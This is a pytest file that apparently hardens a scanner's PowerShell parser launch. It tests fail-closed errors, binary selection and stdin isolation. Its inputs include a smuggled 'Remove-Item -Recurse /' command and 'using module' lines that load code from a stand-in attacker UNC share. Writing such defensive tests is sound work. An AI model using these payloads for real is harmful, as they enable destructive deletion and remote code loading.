"""PowerShell parser launch and isolation for issue #7437.

These tests drive the pwsh boundary with a fake: which binary runs, what it
receives, and how every failure of the parser process fails closed.
"""

import base64
import os
import re
import shutil
import subprocess
import sys
import tempfile
from pathlib import Path
from typing import Any

import pytest

from .test_powershell_coupling import FAKE_PWSH, _fake_pwsh, _mod, assess_content


@pytest.mark.parametrize(
    ("fake", "message"),
    [
        ({"raises": subprocess.TimeoutExpired(["pwsh"], 60)}, "timed out after 60 seconds"),
        ({"raises": PermissionError("denied")}, "failed to start: denied"),
        ({"returncode": 1, "stderr": "ParserFailure"}, "exited 1: ParserFailure"),
        ({"returncode": 3, "stderr": "", "stdout": ""}, "exited 3: no output"),
        ({"stdout": "not json"}, "unreadable output"),
        ({"stdout": "[1, 2]"}, "returned list"),
        ({"stdout": '{"count":-1,"errors":[]}'}, "returned count -1"),
        ({"stdout": '{"count":"3","errors":[]}'}, "returned count '3'"),
        ({"stdout": '{"count":true,"errors":[]}'}, "returned count True"),
        ({"stdout": '{"errors":[]}'}, "returned count None"),
        ({"stdout": '{"count":1,"errors":"bad"}'}, "returned errors as 'bad'"),
        ({"stdout": '{"count":1}'}, "returned errors as None"),
        (
            {"stdout": '{"count":1,"errors":{"id":"X","line":4,"message":"Bad token."}}'},
            "1 syntax error(s), first at line 4: Bad token.",
        ),
    ],
)
def test_broken_parser_results_fail_closed(
    monkeypatch: pytest.MonkeyPatch, fake: dict[str, Any], message: str
) -> None:
    """No parser failure mode returns a count."""
    _fake_pwsh(monkeypatch, **fake)

    with pytest.raises(_mod.PowerShellParserError) as excinfo:
        assess_content(Path("Script.ps1"), "Import-Module A\n")

    assert message in str(excinfo.value)


def test_source_travels_on_stdin_from_an_empty_directory(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """CWE-78: source text never reaches the command line, and relative paths resolve nowhere."""
    calls = _fake_pwsh(monkeypatch, stdout='{"count":1,"errors":[]}')
    source = "Import-Module A; $x = '\"; Remove-Item -Recurse /; \"'\n"

    assess_content(Path("Script.ps1"), source)

    (call,) = calls
    assert call["argv"][0] == FAKE_PWSH
    assert call["argv"][1:5] == ["-NoLogo", "-NoProfile", "-NonInteractive", "-EncodedCommand"]
    assert not any("Remove-Item" in part or "Import-Module" in part for part in call["argv"])
    assert call["input"] and "Import-Module" not in call["input"]
    assert call["cwd_entries"] == []
    assert call["timeout"] == 60
    assert "shell" not in call


def test_relative_path_entries_never_supply_pwsh(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """CWE-427: a pwsh planted in the checkout and reached by a relative PATH entry never runs."""
    planted = tmp_path / "bin" / "pwsh"
    planted.parent.mkdir()
    planted.write_text("#!/bin/sh\necho planted\n", encoding="utf-8")
    planted.chmod(0o755)
    monkeypatch.chdir(tmp_path)
    monkeypatch.setenv("PATH", "bin")

    with pytest.raises(_mod.PowerShellParserError, match="not on PATH"):
        assess_content(Path("Script.ps1"), "Import-Module A\n")


def test_pwsh_inside_the_scanned_directory_is_refused(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    calls = _fake_pwsh(monkeypatch)
    monkeypatch.setattr(shutil, "which", lambda _name, path=None: str(tmp_path / "pwsh"))
    monkeypatch.chdir(tmp_path)

    with pytest.raises(_mod.PowerShellParserError, match="inside the scanned directory"):
        assess_content(Path("Script.ps1"), "Import-Module A\n")

    assert calls == []


def test_windows_requires_pwsh_exe(monkeypatch: pytest.MonkeyPatch) -> None:
    calls = _fake_pwsh(monkeypatch)
    monkeypatch.setattr(shutil, "which", lambda _name, path=None: "/opt/pwsh/pwsh.cmd")
    monkeypatch.setattr(sys, "platform", "win32")

    with pytest.raises(_mod.PowerShellParserError, match="must be pwsh.exe"):
        assess_content(Path("Script.ps1"), "Import-Module A\n")

    assert calls == []


def test_pwsh_never_receives_a_using_keyword(monkeypatch: pytest.MonkeyPatch) -> None:
    """CWE-829: no using statement reaches pwsh, so it cannot resolve a UNC or local target."""
    calls = _fake_pwsh(monkeypatch, stdout='{"count":2,"errors":[]}')
    source = (
        "using module \\\\attacker\\share\\Evil.psm1\n"
        "USING assembly //attacker/share/Evil.dll\n"
        "Write-Host $using:Name 'Housing'\n"
    )

    assess_content(Path("Script.ps1"), source)

    (call,) = calls
    sent = base64.b64decode(call["input"]).decode("utf-8")
    residue = sent.replace(_mod._PWSH_USING_SENTINEL, "")
    assert re.search("using", residue, re.IGNORECASE) is None
    assert sent.count("\n") == source.count("\n")
    assert sent.count(_mod._PWSH_USING_SENTINEL) == 4


@pytest.mark.parametrize("spelling", ["u\u017fing", "us\u0131ng", "US\u0130NG", "uSiNg"])
def test_unicode_case_lookalikes_are_neutralized_too(spelling: str) -> None:
    """Defense in depth: any spelling that case-folds to using never reaches pwsh."""
    neutralized = _mod._neutralize_using(f"{spelling} module \\\\host\\share\\x.psm1\n")

    assert neutralized.startswith(_mod._PWSH_USING_SENTINEL)


@pytest.mark.skipif(sys.platform == "win32", reason="symlinks need Developer Mode on Windows")
def test_symlinked_pwsh_runs_by_its_path_entry(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """Snap links /snap/bin/pwsh to /usr/bin/snap, which dispatches on the name it runs as."""
    target = tmp_path / "usr" / "bin" / "snap"
    target.parent.mkdir(parents=True)
    target.write_text("", encoding="utf-8")
    link = tmp_path / "snap" / "bin" / "pwsh"
    link.parent.mkdir(parents=True)
    link.symlink_to(target)
    work = tmp_path / "work"
    work.mkdir()
    monkeypatch.chdir(work)
    calls = _fake_pwsh(monkeypatch, stdout='{"count":1,"errors":[]}')
    monkeypatch.setattr(shutil, "which", lambda _name, path=None: str(link))

    assess_content(Path("Script.ps1"), "Import-Module A\n")

    assert calls[0]["argv"][0] == str(link)


@pytest.mark.skipif(sys.platform == "win32", reason="symlinks need Developer Mode on Windows")
def test_symlink_into_the_scanned_directory_is_refused(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    planted = tmp_path / "work" / "pwsh"
    planted.parent.mkdir()
    planted.write_text("", encoding="utf-8")
    link = tmp_path / "bin" / "pwsh"
    link.parent.mkdir()
    link.symlink_to(planted)
    monkeypatch.chdir(planted.parent)
    calls = _fake_pwsh(monkeypatch)
    monkeypatch.setattr(shutil, "which", lambda _name, path=None: str(link))

    with pytest.raises(_mod.PowerShellParserError, match="inside the scanned directory"):
        assess_content(Path("Script.ps1"), "Import-Module A\n")

    assert calls == []


@pytest.mark.parametrize(
    ("name", "source"),
    [
        ("app.js", 'import a from "a";\n'),
        ("app.ts", 'import a from "a";\n'),
        ("app.py", "import requests\n"),
        ("App.cs", "using System.IO;\n"),
    ],
)
def test_other_parsed_languages_never_reach_pwsh(
    monkeypatch: pytest.MonkeyPatch, name: str, source: str
) -> None:
    """Each parsed language keeps its own counter; only PowerShell starts pwsh."""

    def no_pwsh(_source: str) -> dict[str, Any]:
        raise AssertionError(f"{name} was routed to the PowerShell parser")

    monkeypatch.setattr(_mod, "_run_pwsh_counter", no_pwsh)

    coupling = assess_content(Path(name), source).coupling

    assert coupling.reasons[0] == "1 import/dependency statements"


def test_older_pwsh_fails_closed(monkeypatch: pytest.MonkeyPatch) -> None:
    """The script exits 3 below PowerShell 7; that exit is a failure, never a score."""
    assert "$PSVersionTable.PSVersion.Major -lt 7" in _mod._PWSH_COUNT_SCRIPT
    message = "PowerShell 7 or later is required; found 6.2.7"
    _fake_pwsh(monkeypatch, returncode=3, stderr=message, stdout="")

    with pytest.raises(_mod.PowerShellParserError, match="exited 3: " + re.escape(message)):
        assess_content(Path("Script.ps1"), "Import-Module A\n")


def _two_entry_path(tmp_path: Path, monkeypatch: pytest.MonkeyPatch, first: Path) -> Path:
    """Put *first* and then a real-looking pwsh.exe on PATH; return the second."""
    second = tmp_path / "later" / "pwsh.exe"
    second.parent.mkdir()
    monkeypatch.setenv("PATH", os.pathsep.join([str(first.parent), str(second.parent)]))
    lookups = {str(first.parent): str(first), str(second.parent): str(second)}
    monkeypatch.setattr(shutil, "which", lambda _name, path=None: lookups.get(path))
    return second


def test_windows_skips_a_cmd_shim_for_a_later_pwsh_exe(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    calls = _fake_pwsh(monkeypatch, stdout='{"count":1,"errors":[]}')
    shim = tmp_path / "shims" / "pwsh.cmd"
    shim.parent.mkdir()
    real = _two_entry_path(tmp_path, monkeypatch, shim)
    monkeypatch.setattr(sys, "platform", "win32")

    assess_content(Path("Script.ps1"), "Import-Module A\n")

    assert calls[0]["argv"][0] == str(real)


def test_a_pwsh_in_the_checkout_does_not_hide_a_later_install(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    calls = _fake_pwsh(monkeypatch, stdout='{"count":1,"errors":[]}')
    work = tmp_path / "work"
    (work / "bin").mkdir(parents=True)
    monkeypatch.chdir(work)
    real = _two_entry_path(tmp_path, monkeypatch, work / "bin" / "pwsh.exe")

    assess_content(Path("Script.ps1"), "Import-Module A\n")

    assert calls[0]["argv"][0] == str(real)


def test_temp_cleanup_failure_keeps_a_finished_parse(monkeypatch: pytest.MonkeyPatch) -> None:
    """Windows can hold pwsh's working directory; cleanup must not discard the result."""
    _fake_pwsh(monkeypatch, stdout='{"count":2,"errors":[]}')

    class HeldDirectory(tempfile.TemporaryDirectory[str]):
        def __init__(self, **kwargs: Any) -> None:
            self.ignore = kwargs.get("ignore_cleanup_errors", False)
            super().__init__(**kwargs)

        def __exit__(self, *exc: object) -> None:
            super().__exit__(*exc)
            if not self.ignore:
                raise PermissionError("directory is in use")

    monkeypatch.setattr(tempfile, "TemporaryDirectory", HeldDirectory)

    coupling = assess_content(Path("Script.ps1"), "Import-Module A\nImport-Module B\n").coupling

    assert coupling.reasons[0] == "2 import/dependency statements"
